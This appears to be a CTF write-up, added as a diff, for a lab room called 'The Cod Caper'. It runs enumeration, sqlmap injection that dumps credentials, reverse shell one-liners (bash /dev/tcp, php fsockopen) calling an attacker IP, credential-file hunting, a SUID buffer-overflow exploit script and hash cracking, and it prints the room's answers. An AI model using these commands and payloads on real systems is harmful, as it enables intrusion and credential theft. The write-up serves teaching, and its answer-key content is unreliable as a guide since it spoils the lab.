@@ -1,0 +1,203 @@
+#THE COD CAPER
+>Siam AHmed | 25.11.2021
+target ip ->10.10.184.228
+-----------------------------------------
+
+#Task 1: Host Enumeration 
+The first step is to see what ports and services are running on the target machine. I started my scan with nmap. Let's spin up nmap and have a look at the ports and other services. 
+
+```
+nmap -sC -sV -p- -oN nmap_recon.txt 10.10.184.228
+```
+the output might look like this
+```
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-25 00:50 EST
+Nmap scan report for 10.10.184.228
+Host is up (0.19s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 6d:2c:40:1b:6c:15:7c:fc:bf:9b:55:22:61:2a:56:fc (RSA)
+|   256 ff:89:32:98:f4:77:9c:09:39:f5:af:4a:4f:08:d6:f5 (ECDSA)
+|_  256 89:92:63:e7:1d:2b:3a:af:6c:f9:39:56:5b:55:7e:f9 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 35.67 seconds
+```
+Now that we've found so much information from nmap scan. we can answer the following questions.
+
+#How many ports are open on the target machine?
+2
+#What is the http-title of the web server?
+```Apache2 Ubuntu Default Page: It works```
+
+#What version is the ssh service?
+```OpenSSH 7.2p2 Ubuntu 4ubuntu2.8```
+#What is the version of the web server?
+```Apache/2.4.18```
+
+time to move onto next task.........
+#TASK 2:  Web Enumeration 
+When the question is web we should always check gobuster if automated scan is allowed. as we scanned using nmap gobuster is also allowed. let's find out what url listings or paths are available to visit. we might find something interesting
+
+gobuster would need a wordlist. the recomended wordlist file for this room is "https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/big.txt" we are using a wordlist with few extentions
+
+
+```
+gobuster dir --url http://10.10.184.228/ -w ~/death-Note/wordlist/big.txt -x php,txt,html
+```
+woop!woop! we got our result. This scan was quite different than usual but it was fun to figure out. so we found out our page with status code 200 along with few 403
+
+#What is the name of the important file on the server?
+```administrator.php  ```
+
+so our task 3 is also over. let's move on to the next task. which is my favourite part. we are gonna exploit the web. 
+#TASK 4: Web Exploitation
+now that we found the admin page let's visit. The admin page seems to give us a login form. In situations like this it is always worth it to check for "low-hanging fruit". In the case of login forms one of the first things to check for is SQL Injection. I usually don't use sqlmap for sql injection but Now for quice scan and exploitation I'm gonna use that.
+
+```
+sqlmap -u http://10.10.184.228/administrator.php --form 
+```
+this will search for what to exploit and store those
+```
+sqlmap -u http://10.10.184.228/administrator.php --data 'username=&password=' -a
+```
+this will dump all the data and the passwords
+this takes forver. so I'm quiting  the process and checking for the database. 
+
+```
+sqlmap -u http://10.10.184.228/administrator.php --data 'username=&password=' --dbs
+```
+it shows that we have a users database. let's have a look what do we have that.
+
+```
+sqlmap -u http://10.10.184.228/administrator.php --data 'username=&password=' -D users --tables
+
+```
+
+we got this. now let's see what users we have..
+```
+sqlmap -u http://10.10.184.228/administrator.php --data 'username=&password=' -D users -T users --dump
+
+```
+huh. we find it. we just found the admin user and the password.
+```
++------------+----------+
+| password   | username |
++------------+----------+
+| secretpass | pingudad |
++------------+----------+
+
+```
+ let's answer the following...
+#What is the admin username?
+```pingudad```
+
+#What is the admin password?
+```secretpass```
+
+#How many forms of SQLI is the form vulnerable to?
+3
+
+#TASK 5:
+finally we are now logged into system. let's excute some command. but we are going to need to create reverse shell.
+let's make a reverse shell....
+
+```
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.1.17",4444));
+```
+looks like it's not working
+let's try bash
+```bash -i >& /dev/tcp/10.9.1.17/8080 0>&1```
+
+it's still nbot giving me the shell. let's try php
+```php -r '$sock=fsockopen("10.9.1.17",1337);exec("/bin/sh -i <&3 >&3 2>&3");'```
+so it works. As it runs on web we need to use php rev shell.Now let's  enumerate and find the ssh or hidden password
+
+#How many files are in the current directory?
+run 
+```
+ls -l
+```
+3
+#Do I still have an account
+run 
+```
+cat /etc/passwd
+```
+yes
+#What is my ssh password?
+run ```
+find / -user pingu -print 2>/dev/null
+```
+we can see that in our home and pingu account there is a ssh directory which contains ssh key. but we don't have the password. let's figure out the password.
+```
+find / -name pass* 2>/dev/null
+```
+we can see the password is stored in ```/var/hidden/pass``` let's cat that out.
+the password is
+```
+pinguapingu
+```
+#TASK 6:
+
+first let's install ```linenum``` using scp.```scp /opt/LinEnum.sh pingu@10.10.10.10:/tmp``` and use the password.
+after that connect to the host via ssh connection.
+then move to ```/tmp``` and run the script.
+
+#What is the interesting path of the interesting suid file
+```/opt/secret/root```
+
+#TASK 7:
+using pwndbg type ```gdb /opt/secret/root```
+let's send 50 character using ```r < <(cyclic 50)```
+```cyclic -l 0x6161616c ``` gives us the information about how many character we need to overwrite the eip.
+ 
+#TASK 8:
+```
+disassemble shell
+```
+What we're interested in is the hex memory addresses. So from what we know all we have to do is provide 44 characters, and then "0x080484cb" and the shell function should execute, let's try it!
+
+we are using ```struct```
+
+```
+python -c 'import struct;print "A"*44 + struct.pack("<I",0x080484cb)'
+```
+that's how we do manually binary exploitaion
+
+#TASK 9:
+
+no we are going to write a script in that ssh system and run that. we should get the same results.
+
+```
+
+#! /usr/bin/python
+
+from pwn import *
+proc = process('/opt/secret/root')
+
+elf = ELF('/opt/secret/root')
+shell_function = elf.symbols.shell
+
+payload = fit({
+44: shell_function
+})
+proc.sendline(payload)
+proc.interactive()
+
+```
+#TASK 10:
+from the previous task we should get the root hash now we store that hash into a ```hashfile.hash``` file and use hashcat to crack that hash..
+```
+hashcat -m 1800 -a 0 ./hash_file.hash /usr/share/wordlists/rockyou.txt 
+```
+#What is the root password!
+```love2fish```
+
+#TASK 11:Thank you!
